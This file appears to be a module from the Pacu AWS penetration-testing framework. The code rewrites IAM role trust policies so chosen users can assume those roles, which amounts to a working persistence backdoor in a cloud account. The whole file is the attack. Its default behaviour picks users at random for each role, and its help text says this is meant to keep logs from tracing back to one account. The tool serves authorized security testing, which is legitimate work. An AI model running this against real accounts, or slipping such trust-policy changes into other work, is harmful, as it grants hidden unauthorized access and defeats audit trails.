#!/usr/bin/env python3
import argparse
import boto3, botocore
from functools import partial
import json
import os
from random import choice

from pacu import util


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'backdoor_assume_role',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs based on the idea from https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_all_roles.py',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Creates assume-role trust relationships between users and roles.',

    # Description about what the module does and how it works
    'description': 'This module creates a trust relationship between one or more user accounts and one or more roles in the account, allowing those users to assume those roles.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['IAM'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['enum_users_roles_policies_groups'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--role-names', '--user-arns', '--no-random'],
}


parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--role-names', required=False, default=None, help='A comma-separated list of role names from the AWS account that trust relationships should be created with. Defaults to all roles.')
parser.add_argument('--user-arns', required=False, default=None, help='A comma-separated list of user ARNs that the trust relationship with roles should be created with. By default, user ARNs in this list are chosen at random for each role to try and prevent the tracking of the logs all back to one user account. Without this argument, the module will default to the current user.')
parser.add_argument('--no-random', required=False, action='store_true', help='If this argument is supplied in addition to a list of user ARNs, a trust relationship is created for each user in the list with each role, rather than one of them at random.')


def help():
    return [module_info, parser.format_help()]


def main(args, proxy_settings, database):
    session = util.get_active_session(database)

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = partial(util.print, session_name=session.name, database=database)
    key_info = partial(util.key_info, database=database)
    fetch_data = partial(util.fetch_data, database=database)
    get_aws_key_by_alias = partial(util.get_aws_key_by_alias, database=database)
    ######

    client = boto3.client(
        'iam',
        aws_access_key_id=session.access_key_id,
        aws_secret_access_key=session.secret_access_key,
        aws_session_token=session.session_token,
        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
    )

    rolenames = []
    user_arns = []

    if args.role_names is None:
        all = input('No role names were passed in as arguments, do you want to enumerate all roles and get a prompt for each one (y) or exit (n)? (y/n) ')
        if all.lower() == 'n':
            print('Exiting...')
            return

        if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles') is False:
            print('Pre-req module not run. Exiting...')
            return
        for role in session.IAM['Roles']:
            rolenames.append(role['RoleName'])

    else:
        rolenames = args.role_names.split(',')

    if args.user_arns is None:
        # Find out the current users ARN
        # This should be moved into the creds array in the "UserArn" parameter for those set of keys that are running this module
        user = key_info()
        active_aws_key = get_aws_key_by_alias(session.key_alias)

        if 'UserArn' not in user or user['UserArn'] is None:
            user_info = client.get_user()['User']
            active_aws_key.update(database, user_arn=user_info['Arn'])

        user_arns.append(active_aws_key.user_arn)
    else:
        if ',' in args.user_arns:
            user_arns.extend(args.user_arns.split(','))
        else:
            user_arns.append(args.user_arns) # Only one ARN was passed in

    iam = boto3.resource(
        'iam',
        aws_access_key_id=session.access_key_id,
        aws_secret_access_key=session.secret_access_key,
        aws_session_token=session.session_token,
        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
    )

    for rolename in rolenames:
        target_role = 'n'
        if args.role_names is None:
            target_role = input(f'  Do you want to backdoor the role {rolename}? (y/n) ')

        if target_role == 'y' or args.role_names is not None:
            print(f'Role name: {rolename}')
            role = iam.Role(rolename)
            original_policy = role.assume_role_policy_document
            hacked_policy = modify_assume_role_policy(original_policy, user_arns, args.no_random)

            try:
                response = client.update_assume_role_policy(
                    RoleName=rolename,
                    PolicyDocument=json.dumps(hacked_policy)
                )
                print('  Backdoor successful!\n')
            except Exception as error:
                if 'UnmodifiableEntity' in str(error):
                    print(f'  Failed to update the assume role policy document for role {rolename}: This is a protected service role that is only modifiable by AWS.\n')
                else:
                    print(f'  Failed to update the assume role policy document for role {rolename}: {error}\n')

    print(f'{os.path.basename(__file__)} completed.')
    return


def modify_assume_role_policy(original_policy, user_arns, no_random):
    if 'Statement' in original_policy:
        statements = original_policy['Statement']

        for statement in statements:
            if 'Effect' in statement and statement['Effect'] == 'Allow':
                if 'Principal' in statement and isinstance(statement['Principal'], dict):
                    # Principals can be services, federated users, etc.
                    # 'AWS' signals a specific account based resource
                    # print(statement['Principal'])
                    if 'AWS' in statement['Principal']:
                        if isinstance(statement['Principal']['AWS'], list):
                            # If there are multiple principals, append to the list
                            if no_random:
                                for arn in user_arns:
                                    statement['Principal']['AWS'].append(arn)

                            else:
                                arn = choice(user_arns)
                                statement['Principal']['AWS'].append(arn)

                        else:
                            # If a single principal exists, make it into a list
                            statement['Principal']['AWS'] = [statement['Principal']['AWS']]
                            if no_random:
                                for arn in user_arns:
                                    statement['Principal']['AWS'].append(arn)

                            else:
                                arn = choice(user_arns)
                                statement['Principal']['AWS'].append(arn)

                    else:
                        # No account based principal principal exists
                        if no_random and len(user_arns) > 1:
                            statement['Principal']['AWS'] = []
                            for arn in user_arns:
                                statement['Principal']['AWS'].append(arn)

                        else:
                            arn = choice(user_arns)
                            statement['Principal']['AWS'] = arn

                elif 'Principal' not in statement:
                    # This shouldn't be possible, but alas, it is
                    if no_random and len(user_arns) > 1:
                            statement['Principal'] = {'AWS': []}
                            for arn in user_arns:
                                statement['Principal']['AWS'].append(arn)

                    else:
                        arn = choice(user_arns)
                        statement['Principal'] = {'AWS': arn}

    return original_policy  # now modified in line